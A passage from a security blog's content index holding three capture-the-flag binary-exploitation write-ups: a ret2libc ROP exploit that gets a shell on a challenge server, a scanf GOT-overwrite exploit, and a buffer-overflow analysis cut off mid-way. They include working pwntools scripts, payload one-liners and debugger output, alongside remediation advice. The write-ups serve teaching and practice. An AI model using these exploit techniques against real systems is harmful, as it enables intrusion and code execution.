"/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/process.py", line 787, in close     fd.close()  BrokenPipeError: [Errno 32] Broken pipeThe main function was successfully called again. Now the printf function address can be retrieved to find the base libc address for the second wave of the exploit.Finding Base Libc AddressWith the knowledge of where the printf function is in memory, the base address of libc can be calculated, and therefore the address of system() and location of the /bin/sh string can be determined by adding their offsets to the base libc address:  from pwn import *  REMOTE = False    if REMOTE:     p = remote("mc.ax",31568)  else:   p = process("./ret2the-unknown")    rip_offset = 40  main = 0x0000000000401186    # Wave 1    ## Repeat main function  payload = b'A'*40 + p64(main)  p.recvuntil(b"safely?")  p.sendline(payload)    ## Retrieve printf_address  p.recvuntil(b"there: ")  printf_address = p.recvuntil(b"luck!").split(b"\\n")[0].decode()    # Wave 2    ## Get base libc address  libc = ELF("libc-2.28.so" , checksec = False)  libc.address = int(printf_address,16) - libc.symbols["printf"]    ## Get system and bin_sh addresses ready  system = libc.symbols["system"]  bin_sh = next(libc.search(b"/bin/sh"))    log.success(f"libc base found at: {hex(libc.address)}")  log.info(f"system at: {hex(system)}")  log.info(f"/bin/sh at: {hex(bin_sh)}")  p.interactive()Observe the following addresses denoted in red when executing poc.py:  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $python3 poc.py  [+] Starting local process './ret2the-unknown': pid 7483  [+] libc base found at: 0x7fe5b91a7790[*] system at: 0x7fe5b91ec150[*] /bin/sh at: 0x7fe5b9328ca9[*] Switching to interactive modethat board meeting was a *smashing* success! rob loved the challenge!in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...where is this place? can you help me get there safely?  $ test  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7fe5b91ffcf0  good luck!  [*] Got EOF while reading in interactiveThe exact address of system() could be calculated due to the known offset of this function being 0x449c0 (which is 0x7fe5b91ec150 - 0x7fe5b91a7790). Note that this works because PIE is disabled.Building system(“/bin/sh”)After discovering the addresses of the system() function and /bin/sh string, it follows that the system(“/bin/sh”) call must be built and executed using the aforementioned addresses. To do so, it is important to be able to control the RDI register which is used to pass parameters into functions. The RDI, RSI, RDX, and RCX registers are all used for that purpose, but they function via a hierarchical basis, in which the parameter passed into a function follows that particular order[3]:some_function(parameter1,parameter2,parameter3,parameter4)parameter1 corresponds to RDI, parameter2 corresponds to RSI, and so on.Therefore, to pass /bin/sh to system(), it is important to pop the RDI register and pass in the desired parameter value. Using the ROPgadget –binary ret2the-unknown command, ROP gadgets that perform the desired pop operation can be found with their respective locations in memory:0x00000000004012a3 : pop rdi ; retExploitUsing this gadget, the system() call will contain /bin/sh as its argument, and a shell will be returned:  from pwn import *    REMOTE = True    if REMOTE:     p = remote("mc.ax",31568)  else:   p = process("./ret2the-unknown")    rip_offset = 40  main = 0x0000000000401186  Wave 1  ## Repeat main function  payload = b'A'*40 + p64(main)  p.recvuntil(b"safely?")  p.sendline(payload)    # Retrieve printf_address  p.recvuntil(b"there: ")  printf_address = p.recvuntil(b"luck!").split(b"\\n")[0].decode()      ## Wave 2    # Get base libc address  libc = ELF("libc-2.28.so" , checksec = False)    print(libc.symbols["system"])  libc.address = int(printf_address,16) - libc.symbols["printf"]    # Get system and bin_sh address ready  system = libc.symbols["system"]  bin_sh = next(libc.search(b"/bin/sh"))    log.success(f"libc base found at: {hex(libc.address)}")  log.info(f"system at: {hex(system)}")  log.info(f"/bin/sh at: {hex(bin_sh)}")    # Creating the final payload  pop_rdi = 0x00000000004012a3  payload = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)    p.sendline(payload)  p.interactive()Running the exploit results in the successful return of a shell:  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $python3 poc.py  [+] Opening connection to mc.ax on port 31568: Done  281024  [+] libc base found at: 0x7ff17ea82000  [*] system at: 0x7ff17eac69c0  [*] /bin/sh at: 0x7ff17ec03519  [*] Switching to interactive modethat board meeting was a *smashing* success! rob loved the challenge!in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...where is this place? can you help me get there safely?  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7ff17eada560  good luck!  $ id  uid=1000 gid=1000 groups=1000  $ ls  flag.txt  run  $ cat flag.txt  flag{ro[REDACTED]sing}ConclusionThe insecure gets() function should never be used due to its lack of boundary checks on user input. This can result in the overwriting of memory that can lead to arbitrary code execution. ASLR and enabling the NX bit are not adequate in the prevention of binary exploitation (however they do help mitigate vulnerabilities). The following remediations should be strongly considered to prevent the attack outlined in this report:      Replace the gets() function with fgets()        The latter performs boundary checks on user input which mitigates buffer overflow attacks        Implement PIE    Return-to-libc attacks worked by calculating the addresses of the system function and base libc address based on their known offers      By enabling PIE, the known offsets between executables cannot be predicted as they change with each new runtime process        Implement  a stack canary    The stack canary will mitigate buffer overflow attacks by protecting the return pointerPort 31568 should be closed immediately until the current binary is replaced with a more secure version that follows the aforementioned remediations.[1] https://www.ibm.com/docs/en/i/7.3?topic=functions-setbuf-control-buffering [2] https://github.com/Gallopsled/pwntools [3] https://trustfoundry.net/basic-rop-techniques-and-tricks/",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Passcode Writeup",
      "category" : "",
      "tags"     : "GOT, dynamic, and Binary Exploitation",
      "url"      : "/2021/07/15/Passcode-Writeup/",
      "date"     : "Jul 15, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.PasscodeUsing scanf() to Overwrite Memory   0xd4yJuly 15, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3Binary Behavior        3Source Code        3Executing Binary        5GDB        5Examining Segmentation Fault        5Taking Advantage of name[100]        6Exploit Construction        8Where to Jump        8Which Function to Overwrite        9Final Exploit        9Post Exploitation Analysis        11Understanding Dynamic Linking        11Examining the GOT Overwrite in GDB        12Conclusion        16Executive SummaryInsecure code in the passcode.c file resulted in user-control of memory that is meant to be inaccessible. The lack of boundary checks in the login() function coupled with the improper usage of the libc scanf() function, consequently lead to the execution of the /bin/cat system command upon passing a carefully constructed malicious string. Specifically, the second parameter of scanf() was not an integer pointer value as it was not prepended with an ampersand. Taking advantage of insecure code and the fact that the binary in question is dynamically linked, an attacker is capable of overwriting the GOT entry of printf() or fflush() to jump to any place in the binary’s memory.  Attack NarrativeThe source code and compiled binary of the program were provided. Furthermore, the SSH credentials of the owner of this binary were given:UsernamePasswordPasscodeguestBinary BehaviorSource CodeBefore executing the binary, the program’s behavior will first be analyzed:  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;    void login(){       int passcode1;       int passcode2;       printf("enter passcode1 : ");       scanf("%d", passcode1);         fflush(stdin);       // ha! mommy told me that 32bit is vulnerable to bruteforcing :)       printf("enter passcode2 : ");       scanf("%d", passcode2);       printf("checking...\\n");       if(passcode1==338150 &amp;&amp; passcode2==13371337){               printf("Login OK!\\n");                 system("/bin/cat flag");         }       else{               printf("Login Failed!\\n");               exit(0);         }  }    void welcome(){       char name[100];       printf("enter you name : ");       scanf("%100s", name);       printf("Welcome %s!\\n", name);  }    int main(){       printf("Toddler's Secure Login System 1.0 beta.\\n");           welcome();         login();       // something after login...       printf("Now I can safely trust you that you have credential :)\\n");       return 0;  }There are three user-created functions in total: main(), welcome(), and login(). The main() function, however, is not of interest as it only calls printf() and the welcome() and login() functions. Looking at welcome(), a buffer name[100] is initialized with 100 bytes. Afterwards, the scanf() function is called with %100s as the first argument; up to 100 bytes of data are passed into the aforementioned buffer and subsequently printed out when passed into printf() (this behavior is examined in the Taking Advantage of name[100] section). After welcome() is called, the login() function is executed.Two variables are initialized: int passcode1 and int passcode2. Following the initialization of these variables, scanf(“%d”, passcode1) is called, but the second argument is not an integer pointer (as it is not prepended with the ampersand symbol). Next, fflush(stdin) is called as opposed to fflush(stdout). Incidentally, usage of the former is not recommended as it can invoke strange behavior due to it being undefined. The call to fflush() is meant for output streams only in which the buffered data is outputted to the console[1]. The scanf() function is then called again in which the second argument is not prepended with the ampersand symbol. Lastly, an if statement is run which is true when passcode1 is equal to 338150 and passcode2 is equal to 13371337. On the condition that this is true, the flag located on the target system is read out.Executing BinaryExecuting the binary with the input of 338150 for passcode1 and 13371337 for passcode2 results in a segmentation fault:  ┌──(0xd4y㉿Writeup)-[~/.../other/pwnable.kr/easy/passcode]  └─$ ./passcode                                                                                      Toddler's Secure Login System 1.0 beta.  enter you name : 0xd4y  Welcome 0xd4y!  enter passcode1 : 338150  enter passcode2 : 13371337  zsh: segmentation fault  ./passcodeThis behavior can be further examined using GDB, a GNU project debugger useful for dynamic analysis[2].GDBExamining Segmentation FaultRunning this binary in GDB, it can be seen that the program experiences a segmentation fault upon calling scanf() when moving EAX to EDX.  0xf7e23250 &lt;__vfscanf_internal+14720&gt;    mov    dword ptr [edx], eaxLooking at the value for the EAX register reveals the input passed to the passcode2 variable:eax            0xcc07c9            13371337Therefore, the input passed into the second parameter of the scanf() function has the ability to overwrite memory.    Taking Advantage of name[100]Recall that welcome() only allocated 100 bytes to user input and implemented the scanf() function with the %s format specifier. The insecurity relating to this utilization of scanf() lies within the fact that it does not perform boundary checks on the user input. This unsafe practice results in a security hole in which user input can overflow the area in memory allocated for this buffer if the developer does not provide a safe value for the field width specifier. In the case of this binary, providing an input of larger than 100 bytes can result in the overflow of otherwise inaccessible memory located within login(). This is because the field width specifier is 100 (%100s) and 100 bytes were allocated to the name buffer. Therefore, the trailing null byte will spill into memory located right after the buffer. To demonstrate this concept, observe the following:  First, the login() function is disassembled to find when the initial if statement occurs.  pwndbg&gt; disass login  Dump of assembler code for function login:    0x08048564 &lt;+0&gt;:     push   ebp  0x08048565 &lt;+1&gt;:     mov    ebp,esp  0x08048567 &lt;+3&gt;:     sub    esp,0x28    0x0804856a &lt;+6&gt;:     mov    eax,0x8048770    0x0804856f &lt;+11&gt;:    mov    DWORD PTR [esp],eax  0x08048572 &lt;+14&gt;:    call   0x8048420 &lt;printf@plt&gt;    0x08048577 &lt;+19&gt;:    mov    eax,0x8048783    0x0804857c &lt;+24&gt;:    mov    edx,DWORD PTR [ebp\-0x10]    0x0804857f &lt;+27&gt;:    mov    DWORD PTR [esp+0x4],edx  0x08048583 &lt;+31&gt;:    mov    DWORD PTR [esp],eax  0x08048586 &lt;+34&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x0804858b &lt;+39&gt;:    mov    eax,ds:0x804a02c    0x08048590 &lt;+44&gt;:    mov    DWORD PTR [esp],eax  0x08048593 &lt;+47&gt;:    call   0x8048430 &lt;fflush@plt&gt;    0x08048598 &lt;+52&gt;:    mov    eax,0x8048786    0x0804859d &lt;+57&gt;:    mov    DWORD PTR [esp],eax  0x080485a0 &lt;+60&gt;:    call   0x8048420 &lt;printf@plt&gt;    0x080485a5 &lt;+65&gt;:    mov    eax,0x8048783    0x080485aa &lt;+70&gt;:    mov    edx,DWORD PTR [ebp\-0xc]    0x080485ad &lt;+73&gt;:    mov    DWORD PTR [esp+0x4],edx  0x080485b1 &lt;+77&gt;:    mov    DWORD PTR [esp],eax  0x080485b4 &lt;+80&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x080485b9 &lt;+85&gt;:    mov    DWORD PTR [esp],0x8048799    0x080485c0 &lt;+92&gt;:    call   0x8048450 &lt;puts@plt&gt;  0x080485c5 &lt;+97&gt;:    cmp    DWORD PTR [ebp\-0x10],0x528e6  0x080485cc &lt;+104&gt;:   jne    0x80485f1 &lt;login+141&gt;  0x080485ce &lt;+106&gt;:   cmp    DWORD PTR [ebp\-0xc],0xcc07c9  0x080485d5 &lt;+113&gt;:   jne    0x80485f1 &lt;login+141&gt;    0x080485d7 &lt;+115&gt;:   mov    DWORD PTR [esp],0x80487a5    0x080485de &lt;+122&gt;:   call   0x8048450 &lt;puts@plt&gt;    0x080485e3 &lt;+127&gt;:   mov    DWORD PTR [esp],0x80487af    0x080485ea &lt;+134&gt;:   call   0x8048460 &lt;system@plt&gt;    0x080485ef &lt;+139&gt;:   leave   0x080485f0 &lt;+140&gt;:   ret     0x080485f1 &lt;+141&gt;:   mov    DWORD PTR [esp],0x80487bd    0x080485f8 &lt;+148&gt;:   call   0x8048450 &lt;puts@plt&gt;    0x080485fd &lt;+153&gt;:   mov    DWORD PTR [esp],0x0    0x08048604 &lt;+160&gt;:   call   0x8048480 &lt;exit@plt&gt;Note the line highlighted in red which signifies the beginning of the if statement. The hex value 0x528e6 (338150 in decimal) is compared to ebp-0x10, thus at this point in memory lies passcode1.  By the same token, the line highlighted in purple represents passcode2 in which 0xcc07c9 (13371337 in decimal) is compared to ebp-0xc.  After setting a breakpoint at login+97 (0x080485c5), the program is run with a username of 101 A’s.  pwndbg&gt; b *login+97  Breakpoint 1 at 0x80485c5  pwndbg&gt; r  Starting program: /home/0xd4y/business/other/pwnable.kr/easy/passcode/passcode  Toddler's Secure Login System 1.0 beta.  enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!  enter passcode1 : enter passcode2 : checking...  Now looking at the value located at ebp-0x10 shows something of interest:  pwndbg&gt; x/x $ebp-0x10  0xffffd008:     0x4141414141 in hex is ‘A’. Therefore, upon passing a large input to the name[100] buffer, the value for passcode1 can be written into. Additionally, observe the value for passcode2 located at ebp-0xc:  pwndbg&gt; x/x $ebp\-0xc  0xffffd00c:     0x2b959b00The null byte, a byte which is automatically appended to the end of a string to signify its end, leaks into passcode2 as can be seen from the trailing 0’s. Moreover, note how although 101 A’s were passed, the last trailing A did not flood into the value for passcode2 because of the field width specification (namely %100s) in the scanf(“%100s”, passcode1) call.Exploit ConstructionWhere to JumpDue to the unstable nature of this binary, passing in 338150 as passcode1 and 13371337 as passcode2 does not result in the expected execution of /bin/cat, rather a segmentation fault occurs (see Examining Segmentation Fault). Therefore, in order to execute /bin/cat, it is essential that the program is manipulated to point to an address after the if statement and before the call to the system command. Looking at the disassembly of the login() function, this leaves the following addresses: 0x080485d7, 0x080485de, and 0x080485e3. For the purposes of this report, the 0x080485d7 address is used which is 134514135 in decimal.Which Function to OverwriteWith the established notion that one of the aforementioned values is necessary for the desired jump to the system call, the next question is “Which memory address should be overwritten with the desired value?”. Ideally, the memory of a used function can be overwritten so as to point to one of the desired values.Using the readelf -a passcode command, the file header, sections, and symbols (along with a lot of other information) can be seen. This facilitates the process of finding where functions are mapped onto memory.  Relocation section '.rel.plt' at offset 0x398 contains 9 entries:                                          Offset     Info    Type            Sym.Value  Sym. Name  0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0                                          0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0  0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4  0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0  0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0  0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__    0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0    0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0  0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7There are nine functions in total that readelf found. However, looking at the Source Code, only two functions are used before the system call and after scanf(): printf() and fflush(). Either function will work for this exploit, however in this report the printf() function is utilized. Due to this binary being in little-endian format, printf() in bytes is \x00\xa0\x04\x08.Final ExploitPiecing the information found in Where to Jump and Which Function to Overwrite together, the final exploit can be constructed:Pseudo-Exploit: JUNK_BYTE * 96 + FUNCTION_TO_OVERWRITE + WHERE_TO_JUMPExploit: python -c “print ‘A’*96 + ‘\x00\xa0\x04\x08’ + ‘134514135’   passcode@pwnable:~$ python -c "print 'A'*96 + '\\x00\\xa0\\x04\\x08' + '134514135'" |./passcode  Toddler's Secure Login System 1.0 beta.  enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!  enter passcode1 : Login OK!  Sor[REDACTED] out scanf usage :(  Now I can safely trust you that you have credential :)Post Exploitation AnalysisThe binary exploited in this report was unstripped and dynamically linked:  ┌──(0xd4y㉿Writeup)-[~/.../other/pwnable.kr/easy/passcode]  └─$ file passcode  passcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not strippedThe fact that it was dynamically linked played an essential role in making the exploit succeed. To understand exactly how it worked, it is important to realize what dynamic linking is and how it operates.Understanding Dynamic LinkingWhen a binary is dynamically linked, the libc calls within the program do not point to any meaningful addresses. Take the following snippet from passcode for example:  0x08048593 &lt;+47&gt;:    call   0x8048430 &lt;fflush@plt&gt;  0x08048598 &lt;+52&gt;:    mov    eax,0x8048786  0x0804859d &lt;+57&gt;:    mov    DWORD PTR [esp],eax0x080485a0 &lt;+60&gt;:    call   0x8048420 &lt;printf@plt&gt;Note the text highlighted in red. The program calls fflush() and printf() which are at 0x8048430 and 0x8048420 respectively. Since this binary is dynamically linked, before the binary is ever run, fflush() and printf() (and any other libc function for that matter) refer to placeholder addresses such as 0x00000000. However, once the program is loaded, these addresses are resolved using the help of the Global Offset Table (GOT) and Procedure Linkage Table (PLT), a table which converts position-independent function calls to absolute locations[3]. When a libc function is called, the first thing the PLT does is jump to the GOT (Global Offset Table) entry of the called function. The GOT maps symbols (such as printf()) to their actual location[4]. Thus, when the exploit was passed into the binary, the GOT entry which maps printf() to its actual location was overwritten to instead point to 0x080485d7.Examining the GOT Overwrite in GDBThe way the binary handles the malicious input can be examined more in detail within GDB. After disassembling the login() function, it can be seen that the printf() call that occurs after scanf() is at login+60 (or 0x080485a0):  0x080485a0 &lt;+60\&gt;:    call   0x8048420 &lt;printf@plt\&gt;After setting a breakpoint at this function and passing in the exploit, the breakpoint gets hit:  pwndbg&gt; b *login+60                    Breakpoint 1 at 0x80485a0                pwndbg&gt; r &lt; &lt;(python -c "print 'A'*96+'\\x00\\xa0\\x04\\x08'+'134514135'")  Starting program: /home/0xd4y/business/other/pwnable.kr/easy/passcode/passcode &lt; &lt;(python -c "print 'A'*96+'\\x00\\xa0\\x04\\x08'+'134514135'")  Toddler's Secure Login System 1.0 beta.                                                                    enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!                                                                                                           Breakpoint 1, 0x080485a0 in login ()                                                                      LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  ───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────  EAX  0x8048786 ◂\-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */  EBX  0x0                                            ECX  0x0                                                                                                  EDX  0xffffffff                                      EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂\-- 0x1e4d6c  ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂\-- 0x1e4d6c                                                    EBP  0xffffd038 \--▸ 0xffffd058 ◂-- 0x0      ESP  0xffffd010 \--▸ 0x8048786 ◂-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */EIP  0x80485a0 (login+60) \--▸ 0xfffe7be8 ◂-- 0x0                                                            ───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────  ► 0x80485a0 &lt;login+60&gt;     call   printf@plt &lt;printf@plt&gt;It was established that this exploit works. Therefore, somewhere within memory the address 0x80485d7 is loaded up. To find its exact location, the info proc mappings and find command within GDB can be utilized:  pwndbg&gt; info proc mappings  process 1961  Mapped address spaces:       Start Addr   End Addr       Size     Offset objfile          0x8048000  0x8049000     0x1000        0x0 /home/0xd4y/business/other/pwnable.kr/easy/passcode/passcode          0x8049000  0x804a000     0x1000        0x0 /home/0xd4y/business/other/pwnable.kr/easy/passcode/passcode          0x804a000  0x804b000     0x1000     0x1000 /home/0xd4y/business/other/pwnable.kr/easy/passcode/passcode          0x804b000  0x806d000    0x22000        0x0 [heap]         0xf7dca000 0xf7de7000    0x1d000        0x0 /usr/lib/i386-linux-gnu/libc-2.31.so       0xf7de7000 0xf7f3c000   0x155000    0x1d000 /usr/lib/i386-linux-gnu/libc-2.31.so       0xf7f3c000 0xf7fac000    0x70000   0x172000 /usr/lib/i386-linux-gnu/libc-2.31.so       0xf7fac000 0xf7fad000     0x1000   0x1e2000 /usr/lib/i386-linux-gnu/libc-2.31.so       0xf7fad000 0xf7faf000     0x2000   0x1e2000 /usr/lib/i386-linux-gnu/libc-2.31.so       0xf7faf000 0xf7fb1000     0x2000   0x1e4000 /usr/lib/i386-linux-gnu/libc-2.31.so       0xf7fb1000 0xf7fb3000     0x2000        0x0         0xf7fca000 0xf7fcc000     0x2000        0x0         0xf7fcc000 0xf7fd0000     0x4000        0x0 [vvar]         0xf7fd0000 0xf7fd2000     0x2000        0x0 [vdso]         0xf7fd2000 0xf7fd3000     0x1000        0x0 /usr/lib/i386-linux-gnu/ld-2.31.so       0xf7fd3000 0xf7ff0000    0x1d000     0x1000 /usr/lib/i386-linux-gnu/ld-2.31.so       0xf7ff0000 0xf7ffb000     0xb000    0x1e000 /usr/lib/i386-linux-gnu/ld-2.31.so       0xf7ffc000 0xf7ffd000     0x1000    0x29000 /usr/lib/i386-linux-gnu/ld-2.31.so       0xf7ffd000 0xf7ffe000     0x1000    0x2a000 /usr/lib/i386-linux-gnu/ld-2.31.so       0xfffdd000 0xffffe000    0x21000        0x0 [stack]Recall that 134514135 is 0x080485d7 in hex and it points to the location between the if statement and system call.  pwndbg&gt; p/x 134514135  $1 = 0x80485d7  pwndbg&gt; find 0x8048000,0x806d000,0x80485d7  0x804a000 &lt;printf@got.plt&gt;  warning: Unable to access 15357 bytes of target memory at 0x8069404, halting search.  1 pattern found.  pwndbg&gt; x/x 0x804a000  0x804a000 &lt;printf@got.plt&gt;:     0x080485d7Note that the find command has the syntax find _start_address, _end_address, _what_to_look_forThe pointer for printf() was successfully overwritten to 0x08045d7. Observe that this is different from the printf pointer before the exploit:  pwndbg&gt; x/x 0x804a000  0x804a000 &lt;printf@got.plt&gt;:     0x08048426When stepping one instruction, it is expected that from the printf() call, the program will look at the GOT entry of printf(). The program will then be tricked to believe that the code for printf() can be found at 0x08045d7, and the EIP will therefore point to 0x08045d7:  \=&gt; 0x080485a0 &lt;+60&gt;:    call   0x8048420 &lt;printf@plt&gt;pwndbg&gt; x/x $eip  0x80485a0 &lt;login+60&gt;:   0xfffe7be8pwndbg&gt; s  0x080485d7 in login ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  ──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────EAX  0x8048786 ◂-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */EBX  0x0ECX  0x0EDX  0xffffffffEDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂-- 0x1e4d6cESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂-- 0x1e4d6cEBP  0xffffd038 --▸ 0xffffd058 ◂-- 0x0  *ESP  0xffffd00c --▸ 0x80485a5 (login+65) ◂-- mov    eax, 0x8048783  *EIP  0x80485d7 (login+115) ◂-- mov    dword ptr [esp], 0x80487a5  ───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────  ► 0x80485d7 &lt;login+115&gt;    mov    dword ptr [esp], 0x80487a5    0x80485de &lt;login+122&gt;    call   puts@plt &lt;puts@plt&gt;      0x80485e3 &lt;login+127&gt;    mov    dword ptr [esp], 0x80487af    0x80485ea &lt;login+134&gt;    call   system@plt &lt;system@plt&gt;Observe the instruction pointer (EIP) which jumped to the location between the if statement and system call.ConclusionThe binary was successfully exploited which resulted in the leakage of otherwise inaccessible data. Compiler warnings should never be ignored. Unsafe practices involving user-input can lead to security holes. The scanf() function was improperly used, and is not recommended when dealing with strings (unless the developer is careful of the field width specifier and allocated buffer size). Furthermore, the second argument of scanf() was not prepended with the ampersand symbol, which allowed for the passing of an address causing the overwrite of printf(). The following remediations should be strongly considered:      Prepend scanf() with the amerpand symbol (&amp;)    Failure to do so allowed for the direct passing of an address      When dealing with strings, allocate at most a field width that is one less than the buffer        Due to name[100] having 100 bytes, the scanf() field width specifier should be 99 instead of 100 to take into account the null byte        Use sscanf() in conjunction with getline() when dealing with user-inputted strings    getline() automatically allocates an appropriate buffer size to safely fit the input string[5]  The buffer of getline() can then be parsed with sscanf()The aforementioned remediations should be followed as soon as possible to prevent the attack described in this report. It is essential that the developer follow safe programming practices especially when dealing with user-input.[1] https://www.geeksforgeeks.org/use-fflushstdin-c/ [2] https://www.gnu.org/software/gdb/ [3] https://docs.oracle.com/cd/E26505_01/html/E26506/chapter6-1235.html [4] https://en.wikipedia.org/wiki/Global_Offset_Table [5] https://man7.org/linux/man-pages/man3/getline.3.html",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "You Know Writeup",
      "category" : "",
      "tags"     : "Buffer Overflow and Shellcode",
      "url"      : "/2021/07/01/You-Know-Writeup/",
      "date"     : "Jul 1, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.You KnowBuffer overflow and local variable control   0xd4yJuly 1, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3Binary Analysis        3Behavior        3Ghidra        3GDB        4Constructing Exploit        5EIP Offset        5Flag() Debug        6Exploit        12Conclusion        15Executive SummaryThe binary in question was provided within a zip file. The source code of the program was not given, and analysis was performed using Ghidra for static analysis and GDB for dynamic analysis. Due to the usage of the vulnerable gets() function which fails to perform boundary checks, the program is vulnerable to buffer overflow exploits.Attack NarrativeThe IP and port on which the vulnerable binary runs is given:IPPort159.65.54.5031449Other than this information, no other data is provided.Binary AnalysisBefore attempting to execute the binary, is it essential to first analyze how it works.BehaviorUpon executing the binary, the user is prompted with an input:  ┌─[0xd4y@Writeup]─[~/business/hackthebox/easy/windows/love]                                                                                                                  └──╼ $./vuln  You know who are 0xDiablos:  test  testWhatever string the user inputs, the same input gets printed back out. To analyze how this binary works, tools such as GDB[1] (for dynamic analysis) and Ghidra[2] (for static analysis) are used throughout this report.GhidraMany different programs can be used for static analysis, however Ghidra, a tool created by the NSA, is utilized throughout this report because of its capability to translate assembly code into C code for easier analysis. Looking at the output of Ghidra, the following three functions are found:Within main() the string You know who are 0xDiablos: is printed out before the vuln() function is executed. This function allocates 180 bytes to the buffer local_bc before the vulnerable gets() function is executed with local_bc as the argument. The gets() function is a deprecated function within C due to its inability to perform boundary checks on the user input. The manual for the function states to “Never use this function”[3].The third function of the binary, namely flag(), was not called by either main() or vuln(). The flag() function checks if a file flag.txt exists. If it does, then it performs an if statement in which it compares the param_1 and param_2 to certain hex values. On condition that this if statement is true, the contents of flag.txt are read out.GDB        Analysing this function through GDB helps in dissecting what the program is doing on the assembly level:  0x08049246 &lt;+100&gt;:   cmp    DWORD PTR [ebp+0x8],0xdeadbeef                          0x0804924d &lt;+107&gt;:   jne    0x8049269 &lt;flag+135&gt;                                    0x0804924f &lt;+109&gt;:   cmp    DWORD PTR [ebp+0xc],0xc0ded00dThe aforementioned if statement compares the value of the base pointer + 8 to 0xdeadbeef and the base pointer + 12 to 0xc0ded00d. Therefore, a successful exploit will constitute the control of the foregoing base pointer addresses along with the overwriting of the EIP register to point to the flag() function.Constructing ExploitEIP OffsetThe offset of the EIP register overwrite must first be determined. Within GDB, in order to provide an input to a program which prompts the user for a string, the desired string must first be echoed into a file. The contents of this file can then be run within the debugger. Hence, using the cyclic function, a pattern of 200 bytes was echoed into a file called eip_overwrite as follows:  ┌─[0xd4y@Writeup]─[~/business/hackthebox/easy/windows/love]                                                                                                                  └──╼ $cyclic 200 &gt; eip_overwriteThe contents of this file are then piped into the program with r &lt; eip_overwrite:  ┌─[0xd4y@Writeup]─[~/business/hackthebox/challenges/pwn/easy/you_know]                                                                                                └──╼ $gdb -q ./vuln  pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)  Reading symbols from ./vuln...                                                          (No debugging symbols found in ./vuln)                                                                                                                                        pwndbg&gt; r &lt; eip_overwrite  Starting program: /home/0xd4y/business/hackthebox/challenges/pwn/easy/you_know/vuln &lt; eip_overwrite  You know who are 0xDiablos:  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabs  aabtaabuaabvaabwaabxaabyaab                                                                                                                                                                                                                                                                                                                                 Program received signal SIGSEGV, Segmentation fault.  0x62616177 in ?? ()          LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  